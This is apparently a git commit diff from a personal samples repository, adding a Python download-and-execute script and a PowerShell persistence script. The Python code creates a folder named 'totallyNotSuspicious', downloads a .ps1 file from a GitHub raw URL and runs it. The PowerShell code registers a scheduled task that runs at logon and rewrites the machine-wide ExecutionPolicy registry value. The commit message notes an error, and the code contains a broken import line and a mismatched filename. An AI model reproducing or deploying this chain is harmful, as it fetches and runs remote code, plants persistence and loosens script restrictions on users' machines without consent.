865f430b51d2ff25c9a453d84c4a50abbafab8b4
Acrasy <sai.whocares@gmail.com>
2019-10-10 01:32:21 +0200

    python download and execute | ps trial - ERROR

--- codesamples/initialize/code/initialize.py
+++ codesamples/initialize/code/initialize.py
@@ -1,3 +1,10 @@
 import subprocess
+import pathlib from Path
+import wget
+import os
+cwd=os.path.join(Path.home(),"Documents","totallyNotSuspicious")
+os.mkdir(cwd)
+os.chdir(cwd)
+wget.download('https://raw.githubusercontent.com/Acrasy/samples/master/codesamples/initialize/code/persitence.ps1')
 
 subprocess.call([r'.\persistence.ps1'])
--- codesamples/initialize/code/persitence.ps1
+++ codesamples/initialize/code/persitence.ps1
@@ -1,1 +1,19 @@
-$A = New-ScheduledTaskAction -Execute 'print2Desktop.py'
+$A = New-ScheduledTaskAction -Execute 'print.exe'
+$T = New-ScheduledTaskTrigger -AtLogon
+$S = New-ScheduledTaskSettingsSet
+$D= New-ScheduledTask -Action $A -Trigger $T -Settings $S
+
+Register-ScheduledTask T1 -InputObject $D
+
+#Key to change run permission of scripts on local machine
+#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.Powershell
+#PS-cmd to read Key
+
+Get-ItemProperty -Path HKLM:\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.Powershell
+
+#set regkey entry
+$keyName = "ExecutionPolicy"
+$keyValue = "RemoteSigned"
+Set-ItemProperty -Path 'HKLM:\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.Powershell' -Name $keyName -Value $keyValue
+
+#change from
